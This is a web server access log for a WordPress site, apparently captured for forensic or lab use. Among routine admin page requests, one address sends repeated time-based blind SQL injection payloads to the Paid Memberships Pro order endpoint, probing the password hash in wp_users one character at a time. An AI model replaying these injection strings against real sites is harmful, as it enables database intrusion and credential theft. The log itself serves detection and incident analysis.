172.20.129.51 - - [05/Sep/2023:02:53:50 +0000] "GET /wp-admin/images/about-header-freedoms.svg?ver=6.1 HTTP/1.1" 200 8666 "http://www.sipress.com/wp-admin/load-styles.php?c=0&dir=ltr&load%5Bchunk_0%5D=dashicons,admin-bar,common,forms,admin-menu,dashboard,list-tables,edit,revisions,media,themes,about,nav-menus,wp-pointer,widgets&load%5Bchunk_1%5D=,site-icon,l10n,buttons,wp-auth-check&ver=6.1.1" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
172.20.129.51 - - [05/Sep/2023:02:53:51 +0000] "GET /wp-admin/privacy.php HTTP/1.1" 200 7165 "http://www.sipress.com/wp-admin/freedoms.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
172.20.129.51 - - [05/Sep/2023:02:53:51 +0000] "GET /wp-admin/images/privacy.svg?ver=6.1 HTTP/1.1" 200 1210 "http://www.sipress.com/wp-admin/privacy.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
172.20.129.51 - - [05/Sep/2023:02:53:51 +0000] "GET /wp-admin/images/about-header-privacy.svg?ver=6.1 HTTP/1.1" 200 12800 "http://www.sipress.com/wp-admin/load-styles.php?c=0&dir=ltr&load%5Bchunk_0%5D=dashicons,admin-bar,common,forms,admin-menu,dashboard,list-tables,edit,revisions,media,themes,about,nav-menus,wp-pointer,widgets&load%5Bchunk_1%5D=,site-icon,l10n,buttons,wp-auth-check&ver=6.1.1" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
172.20.129.51 - - [05/Sep/2023:02:53:53 +0000] "GET /wp-admin/index.php HTTP/1.1" 200 13736 "http://www.sipress.com/wp-admin/privacy.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
172.20.129.51 - - [05/Sep/2023:02:53:53 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 836 "http://www.sipress.com/wp-admin/index.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
47.53.122.78 - - [05/Sep/2023:02:53:50 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E35%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:53 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C1%2C1%29%29%21%3D36%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:53 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C2%2C1%29%29%3E64%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:57 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C2%2C1%29%29%3E96%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:57 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C2%2C1%29%29%3E80%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
172.20.129.51 - - [05/Sep/2023:02:53:57 +0000] "GET /index.php/2023/09/05/new-post/ HTTP/1.1" 200 12852 "http://www.sipress.com/wp-admin/index.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
47.53.122.78 - - [05/Sep/2023:02:53:57 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C2%2C1%29%29%3E72%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:54:00 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C2%2C1%29%29%3E76%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
172.20.129.51 - - [05/Sep/2023:02:54:03 +0000] "POST /wp-comments-post.php HTTP/1.1" 302 462 "http://www.sipress.com/index.php/2023/09/05/new-post/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
172.20.129.51 - - [05/Sep/2023:02:54:03 +0000] "GET /index.php/2023/09/05/new-post/?unapproved=4&moderation-hash=6085897b724f5f4c78d74cbb7de6cef6 HTTP/1.1" 200 13383 "http://www.sipress.com/index.php/2023/09/05/new-post/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
240.136.42.209 - - [05/Sep/2023:02:54:04 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 579 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
